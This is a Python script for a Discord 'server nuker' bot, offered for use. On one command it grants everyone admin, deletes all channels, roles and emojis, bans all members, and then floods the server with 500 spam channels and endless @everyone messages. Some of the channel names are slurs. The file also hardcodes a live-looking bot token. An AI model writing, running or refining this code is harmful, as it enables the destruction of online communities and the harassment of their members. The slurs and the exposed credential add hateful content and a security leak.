import discord
import os
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

# discord server nuker 2022
# change anything you like :))

token = "OTc1MTc4MTk3NTA5NTA1MDM0.GWZuLW.p7v03J1gqup_TfHIMaCwszWnMWNqinl53rpaIs"


name = 'nuked'

SPAM_CHANNEL = [
    "kcun0001", "kcun0001", "kcun0001", "nuked",
    "nuked", "nuked", "nuked", "nuked",
    "take-some-pings", "ratio", "kcun",
    "have-fun", "fags", "retard-owner-haha", "nuked"
]
SPAM_MESSAGE = ["@everyone @here nuked by kcun :))"]

intents = discord.Intents(messages=True, guilds=True, members=True)

client = commands.Bot(command_prefix='.', intents=intents)

os.system(f'cls & mode 83,24 & title Discord Nuker')

@client.event
async def on_ready():
    print(Style.BRIGHT, Fore.RED + "zt!")
    print(Style.BRIGHT, Fore.RED + "Prefix:" + Style.BRIGHT, Fore.CYAN + client.command_prefix)
    print(Style.BRIGHT, Fore.RED + "Commands:" + Style.BRIGHT, Fore.CYAN + ".darked (nuke), .s (stop)")
    print(Style.BRIGHT, Fore.RED + "Logged in as:" + Style.BRIGHT, Fore.CYAN + client.user.name)
    print(Style.BRIGHT, Fore.RED + "fucking servers!")
   
    await client.change_presence(activity=discord.Game(name="damn"))


@client.command()
@commands.is_owner()
async def s(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully!" +
          Fore.RESET)


@client.command()
async def darked(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.BLUE + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.BLUE + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.GREEN +
                  f"{member.name}#{member.discriminator} Was banned" +
                  Fore.RESET)
        except:
            print(
                Fore.RED +
                f"{member.name}#{member.discriminator} Was unable to be banned."
                + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.GREEN + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.RED + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.GREEN + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.RED + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("zt#7380")
            print(
                Fore.BLUE +
                f"{user.name}#{user.discriminator} Was successfully unbanned."
                + Fore.RESET)
        except:
            print(Fore.BLUE +
                  f"{user.name}#{user.discriminator} Was not unbanned." +
                  Fore.RESET)
    await guild.create_text_channel("hello")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


client.run(token, bot=True)
